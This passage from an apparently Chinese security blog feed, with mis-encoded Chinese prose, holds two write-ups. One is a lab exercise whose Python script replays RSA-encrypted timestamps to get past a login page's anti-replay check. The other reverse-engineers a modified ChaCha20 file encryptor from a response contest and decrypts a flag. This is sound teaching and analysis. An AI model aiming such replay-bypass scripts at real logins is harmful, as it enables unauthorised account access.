&#123;<br>        <span class="hljs-attr">username</span>: username,<br>        <span class="hljs-attr">password</span>: password,<br>        <span class="hljs-attr">random</span>: encryptedTimestamp <span class="hljs-comment">// Replace timestamp with encrypted version</span><br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> dataToSend;<br>&#125;<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sendLoginRequest</span>(<span class="hljs-params">url</span>) &#123;<br><span class="hljs-keyword">const</span> dataToSend = <span class="hljs-title function_">generateRequestData</span>();<br></code></pre></td></tr></table></figure><p>é€šè¿‡ç®—æ³•å¯ä»¥çŸ¥é“ <code>random</code> æ˜¯é€šè¿‡ <code>encryptedTimestamp</code> æ¥çš„ï¼Œ<code>encryptedTimestamp</code> æ˜¯é€šè¿‡æ—¶é—´æˆ³ç»è¿‡ <code>RSA</code> åŠ å¯†æ¥çš„</p><img src="https://img.dkdun.cn/v1/2025/12/dc27fd56d716f26a.png" style="zoom: 50%;" /><p>é˜²æ­¢è¯·æ±‚è¢«é‡æ”¾ï¼ŒåŒæ ·å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_v1_5<br><span class="hljs-keyword">import</span> pprint<br><br>url = <span class="hljs-string">&quot;http://172.22.9.123/encrypt-labs-main/encrypt/norepeater.php&quot;</span><br>public_key = <span class="hljs-string">&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span><br><span class="hljs-string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi</span><br><span class="hljs-string">NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM</span><br><span class="hljs-string">DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb</span><br><span class="hljs-string">ocDbsNeCwNpRxwjIdQIDAQAB</span><br><span class="hljs-string">-----END PUBLIC KEY-----&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rsa_encrypt</span>(<span class="hljs-params">data, public_key</span>):<br>    key = RSA.import_key(public_key)<br>    cipher = PKCS1_v1_5.new(key)<br>    encrypted_data = cipher.encrypt(data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">return</span> b64encode(encrypted_data).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>():<br>    ts = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(time.time() * <span class="hljs-number">1000</span>))<br>    encrypted_ts = rsa_encrypt(ts, public_key)<br>    headers = &#123;<br>        <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;172.22.9.123&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;PHPSESSID=snuhsl9mkun6ftjd3481d3g5nd&quot;</span>,<br>        <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://172.22.9.123&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://172.22.9.123/encrypt-labs-main/easy.php&quot;</span>,<br>    &#125;<br><br>    payload = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123456&quot;</span>,<br>        <span class="hljs-string">&quot;random&quot;</span>: encrypted_ts<br>    &#125;<br>    response = requests.post(url, headers=headers, json=payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Status Code:&quot;</span>, response.status_code)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Response Headers:&quot;</span>)<br>    pprint.pprint(<span class="hljs-built_in">dict</span>(response.headers))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Response Body:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(response.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    send_request()<br>    time.sleep(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>æˆåŠŸ</p><img src="https://img.dkdun.cn/v1/2025/12/5fe8ce2926b379e1.png" style="zoom: 80%;" />]]></content>
    
    
    <categories>
      
      <category>JS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-4æœˆ</title>
    <link href="/2025/05/06/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-4%E6%9C%88/"/>
    <url>/2025/05/06/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-4%E6%9C%88/</url>
    
    <content type="html"><![CDATA[<p>æ”¾å‡ç©å—¨äº†ï¼Œå¿˜è®°æ›´æ–°äº†</p><span id="more"></span><h1 id="å¯ç–‘æ–‡ä»¶"><a href="#å¯ç–‘æ–‡ä»¶" class="headerlink" title="å¯ç–‘æ–‡ä»¶"></a>å¯ç–‘æ–‡ä»¶</h1><p>å‘ç°å¯¹æ–‡ä»¶ <code>f.txt</code> åŠ å¯†ï¼Œå¯†ç ä¸º <code>qewuri</code></p><img src="https://img.dkdun.cn/v1/2025/12/c5c5dc57980e53d9.png" alt="image-20250426103106468" style="zoom: 50%;" /><p><code>sub_18007B240</code> å®ç°äº†ä¸€ä¸ªæµåŠ å¯†ç®—æ³•</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_18007B240</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// rdi</span><br>  __int64 i; <span class="hljs-comment">// rcx</span><br>  _BYTE v6[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">char</span> v7; <span class="hljs-comment">// [rsp+20h] [rbp+0h] BYREF</span><br>  _DWORD v8[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+30h] [rbp+10h] BYREF</span><br>  _DWORD v9[<span class="hljs-number">9</span>]; <span class="hljs-comment">// [rsp+40h] [rbp+20h] BYREF</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [rsp+64h] [rbp+44h] BYREF</span><br>  _BYTE v11[<span class="hljs-number">56</span>]; <span class="hljs-comment">// [rsp+88h] [rbp+68h] BYREF</span><br>  _BYTE v12[<span class="hljs-number">96</span>]; <span class="hljs-comment">// [rsp+C0h] [rbp+A0h] BYREF</span><br>  _BYTE v13[<span class="hljs-number">88</span>]; <span class="hljs-comment">// [rsp+120h] [rbp+100h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v14; <span class="hljs-comment">// [rsp+178h] [rbp+158h]</span><br>  <span class="hljs-type">unsigned</span> __int64 j; <span class="hljs-comment">// [rsp+198h] [rbp+178h]</span><br><br>  v3 = &amp;v7;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">102</span>; i; --i )<br>  &#123;<br>    *(_DWORD *)v3 = <span class="hljs-number">-858993460</span>;<br>    v3 += <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-built_in">sub_1800770F7</span>(&amp;unk_1801AD0A3);<br>  <span class="hljs-built_in">memset</span>(v11, <span class="hljs-number">0</span>, <span class="hljs-number">0xCu</span>);<br>  <span class="hljs-built_in">qmemcpy</span>(v8, <span class="hljs-string">&quot;expand 32-byte k&quot;</span>, <span class="hljs-built_in">sizeof</span>(v8));<br>  <span class="hljs-built_in">sub_1800757E3</span>(v9, a3, <span class="hljs-number">32</span>);<br>  v9[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">sub_1800757E3</span>(&amp;v10, v11, <span class="hljs-number">12</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v14 = <span class="hljs-built_in">sub_180074E79</span>(v13, <span class="hljs-number">1</span>, <span class="hljs-number">64</span>, a1);<br>    <span class="hljs-keyword">if</span> ( !v14 )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-built_in">sub_18007ABE0</span>(v8, v12);<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v14; ++j )<br>    &#123;<br>      v13[j] ^= v12[j];<br>      ++v13[j];<br>    &#125;<br>    <span class="hljs-built_in">sub_1800772F0</span>(v13, <span class="hljs-number">1</span>, v14, a2);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sub_180076850</span>(v6, &amp;unk_180167DA0);<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›å‘ç° <code>sub_18007ABE0</code> æ˜¯ ChaCha20 åŠ å¯†ç®—æ³•</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_18007ABE0</span><span class="hljs-params">(__int64 a1, __int64 a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// rdi</span><br>  __int64 i; <span class="hljs-comment">// rcx</span><br>  _BYTE v5[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">char</span> v6; <span class="hljs-comment">// [rsp+20h] [rbp+0h] BYREF</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [rsp+30h] [rbp+10h] BYREF</span><br>  _BYTE v8[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+34h] [rbp+14h] BYREF</span><br>  _BYTE v9[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+38h] [rbp+18h] BYREF</span><br>  _BYTE v10[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+3Ch] [rbp+1Ch] BYREF</span><br>  _BYTE v11[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+40h] [rbp+20h] BYREF</span><br>  _BYTE v12[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+44h] [rbp+24h] BYREF</span><br>  _BYTE v13[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+48h] [rbp+28h] BYREF</span><br>  _BYTE v14[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+4Ch] [rbp+2Ch] BYREF</span><br>  _BYTE v15[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+50h] [rbp+30h] BYREF</span><br>  _BYTE v16[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+54h] [rbp+34h] BYREF</span><br>  _BYTE v17[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+58h] [rbp+38h] BYREF</span><br>  _BYTE v18[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+5Ch] [rbp+3Ch] BYREF</span><br>  _BYTE v19[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+60h] [rbp+40h] BYREF</span><br>  _BYTE v20[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+64h] [rbp+44h] BYREF</span><br>  _BYTE v21[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+68h] [rbp+48h] BYREF</span><br>  _BYTE v22[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+6Ch] [rbp+4Ch] BYREF</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+84h] [rbp+64h]</span><br>  <span class="hljs-type">int</span> k; <span class="hljs-comment">// [rsp+A4h] [rbp+84h]</span><br>  <span class="hljs-type">int</span> m; <span class="hljs-comment">// [rsp+C4h] [rbp+A4h]</span><br>  <span class="hljs-type">int</span> *v26; <span class="hljs-comment">// [rsp+198h] [rbp+178h]</span><br><br>  v2 = &amp;v6;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">50</span>; i; --i )<br>  &#123;<br>    *(_DWORD *)v2 = <span class="hljs-number">-858993460</span>;<br>    v2 += <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-built_in">sub_1800770F7</span>(&amp;unk_1801AD0A3);<br>  <span class="hljs-built_in">sub_1800757E3</span>(&amp;v7, a1, <span class="hljs-number">64</span>);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">20</span>; j += <span class="hljs-number">2</span> )<br>  &#123;<br>    v26 = &amp;v7;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(&amp;v7, v11, v15, v19);<br>    v26 = (<span class="hljs-type">int</span> *)v8;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(v8, v12, v16, v20);<br>    v26 = (<span class="hljs-type">int</span> *)v9;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(v9, v13, v17, v21);<br>    v26 = (<span class="hljs-type">int</span> *)v10;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(v10, v14, v18, v22);<br>    v26 = &amp;v7;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(&amp;v7, v12, v17, v22);<br>    v26 = (<span class="hljs-type">int</span> *)v8;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(v8, v13, v18, v19);<br>    v26 = (<span class="hljs-type">int</span> *)v9;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(v9, v14, v15, v20);<br>    v26 = (<span class="hljs-type">int</span> *)v10;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(v10, v11, v16, v21);<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">16</span>; ++k )<br>    *(_DWORD *)&amp;v8[<span class="hljs-number">4</span> * k - <span class="hljs-number">4</span>] += *(_DWORD *)(a1 + <span class="hljs-number">4LL</span> * k);<br>  <span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">16</span>; ++m )<br>  &#123;<br>    *(_BYTE *)(a2 + <span class="hljs-number">4</span> * m) = v8[<span class="hljs-number">4</span> * m - <span class="hljs-number">4</span>];<br>    *(_BYTE *)(a2 + <span class="hljs-number">4</span> * m + <span class="hljs-number">1</span>) = <span class="hljs-built_in">BYTE1</span>(*(_DWORD *)&amp;v8[<span class="hljs-number">4</span> * m - <span class="hljs-number">4</span>]);<br>    *(_BYTE *)(a2 + <span class="hljs-number">4</span> * m + <span class="hljs-number">2</span>) = <span class="hljs-built_in">BYTE2</span>(*(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)&amp;v8[<span class="hljs-number">4</span> * m - <span class="hljs-number">4</span>]);<br>    *(_BYTE *)(a2 + <span class="hljs-number">4</span> * m + <span class="hljs-number">3</span>) = <span class="hljs-built_in">HIBYTE</span>(*(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)&amp;v8[<span class="hljs-number">4</span> * m - <span class="hljs-number">4</span>]);<br>  &#125;<br>  ++*(_DWORD *)(a1 + <span class="hljs-number">48</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sub_180076850</span>(v5, &amp;unk_180167C40);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>sub_18007B4B0</code> æ˜¯ ChaCha20 ç®—æ³•çš„ç½®æ¢å‡½æ•°</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_18007B4B0</span><span class="hljs-params">(_DWORD *a1, <span class="hljs-type">int</span> *a2, _DWORD *a3, <span class="hljs-type">int</span> *a4)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-built_in">sub_1800770F7</span>(&amp;unk_1801AD0A3);<br>  *a1 += *a2;<br>  *a4 ^= *a1;<br>  *a4 = <span class="hljs-built_in">HIWORD</span>(*a4) | (*a4 &lt;&lt; <span class="hljs-number">16</span>);<br>  *a3 += *a4;<br>  *a2 ^= *a3;<br>  *a2 = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)*a2 &gt;&gt; <span class="hljs-number">20</span>) | (*a2 &lt;&lt; <span class="hljs-number">12</span>);<br>  *a1 += *a2;<br>  *a4 ^= *a1;<br>  *a4 = <span class="hljs-built_in">HIBYTE</span>(*a4) | (*a4 &lt;&lt; <span class="hljs-number">8</span>);<br>  *a3 += *a4;<br>  *a2 ^= *a3;<br>  result = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)*a2 &gt;&gt; <span class="hljs-number">25</span>) | (*a2 &lt;&lt; <span class="hljs-number">7</span>);<br>  *a2 = result;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»¼ä¸Šæ‰€è¿°ï¼ŒåŠ å¯†ç®—æ³•ä¸ºéæ ‡å‡†çš„ ChaCha20 åŠ å¯†ï¼Œç»è¿‡åŠ å¯†åè¿˜è¿›è¡Œäº†å¼‚æˆ–è‡ªå¢</p><p>flag.enc æ–‡ä»¶æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">12</span> 1D <span class="hljs-number">58</span> 7A 7F <span class="hljs-number">60</span> FE <span class="hljs-number">96</span> <span class="hljs-number">74</span> D6 7B <span class="hljs-number">56</span> <span class="hljs-number">67</span> CE <span class="hljs-number">72</span> 3F F2 D2 CE <span class="hljs-number">47</span> <span class="hljs-number">19</span> <span class="hljs-number">59</span> 9B 09 <span class="hljs-number">42</span> 07 2C <span class="hljs-number">55</span> B7 <span class="hljs-number">44</span> <span class="hljs-number">10</span> DE <span class="hljs-number">46</span> E5 <span class="hljs-number">38</span> B7 <span class="hljs-number">74</span> <span class="hljs-number">95</span> <span class="hljs-number">78</span> <span class="hljs-number">42</span> <span class="hljs-number">95</span> BD 7D B5 <span class="hljs-number">64</span> <span class="hljs-number">55</span> CD <span class="hljs-number">52</span> 8D D2 <span class="hljs-number">69</span> C6 <span class="hljs-number">10</span> 5F <span class="hljs-number">82</span> <span class="hljs-number">29</span> <span class="hljs-number">29</span> 9D <span class="hljs-number">30</span> F6 B4<br></code></pre></td></tr></table></figure><p>ChaCha20 åŠ å¯†ç®—æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> Generator, <span class="hljs-type">Tuple</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ChaCha20</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, key: <span class="hljs-built_in">bytes</span>, nonce: <span class="hljs-built_in">bytes</span>, counter: <span class="hljs-built_in">int</span> = <span class="hljs-number">0</span></span>):<br>        <span class="hljs-variable language_">self</span>.state = [<br>            <span class="hljs-number">0x61707865</span>, <span class="hljs-number">0x3320646e</span>, <span class="hljs-number">0x79622d32</span>, <span class="hljs-number">0x6b206574</span>,<br>            *struct.unpack(<span class="hljs-string">&#x27;&lt;8I&#x27;</span>, key),<br>            counter,<br>            *struct.unpack(<span class="hljs-string">&#x27;&lt;3I&#x27;</span>, nonce)<br>        ]<br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_quarter_round</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span>, c: <span class="hljs-built_in">int</span>, d: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">int</span>, <span class="hljs-built_in">int</span>, <span class="hljs-built_in">int</span>, <span class="hljs-built_in">int</span>]:<br>        a = (a + b) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        d = ((d ^ a) &lt;&lt; <span class="hljs-number">16</span> | (d ^ a) &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        c = (c + d) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        b = ((b ^ c) &lt;&lt; <span class="hljs-number">12</span> | (b ^ c) &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        a = (a + b) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        d = ((d ^ a) &lt;&lt; <span class="hljs-number">8</span> | (d ^ a) &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        c = (c + d) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        b = ((b ^ c) &lt;&lt; <span class="hljs-number">7</span> | (b ^ c) &gt;&gt; <span class="hljs-number">25</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        <span class="hljs-keyword">return</span> a, b, c, d<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_block</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        state = <span class="hljs-variable language_">self</span>.state.copy()<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            state[<span class="hljs-number">0</span>], state[<span class="hljs-number">4</span>], state[<span class="hljs-number">8</span>], state[<span class="hljs-number">12</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">0</span>], state[<span class="hljs-number">4</span>], state[<span class="hljs-number">8</span>], state[<span class="hljs-number">12</span>])<br>            state[<span class="hljs-number">1</span>], state[<span class="hljs-number">5</span>], state[<span class="hljs-number">9</span>], state[<span class="hljs-number">13</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">1</span>], state[<span class="hljs-number">5</span>], state[<span class="hljs-number">9</span>], state[<span class="hljs-number">13</span>])<br>            state[<span class="hljs-number">2</span>], state[<span class="hljs-number">6</span>], state[<span class="hljs-number">10</span>], state[<span class="hljs-number">14</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">2</span>], state[<span class="hljs-number">6</span>], state[<span class="hljs-number">10</span>], state[<span class="hljs-number">14</span>])<br>            state[<span class="hljs-number">3</span>], state[<span class="hljs-number">7</span>], state[<span class="hljs-number">11</span>], state[<span class="hljs-number">15</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">3</span>], state[<span class="hljs-number">7</span>], state[<span class="hljs-number">11</span>], state[<span class="hljs-number">15</span>])<br>            state[<span class="hljs-number">0</span>], state[<span class="hljs-number">5</span>], state[<span class="hljs-number">10</span>], state[<span class="hljs-number">15</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">0</span>], state[<span class="hljs-number">5</span>], state[<span class="hljs-number">10</span>], state[<span class="hljs-number">15</span>])<br>            state[<span class="hljs-number">1</span>], state[<span class="hljs-number">6</span>], state[<span class="hljs-number">11</span>], state[<span class="hljs-number">12</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">1</span>], state[<span class="hljs-number">6</span>], state[<span class="hljs-number">11</span>], state[<span 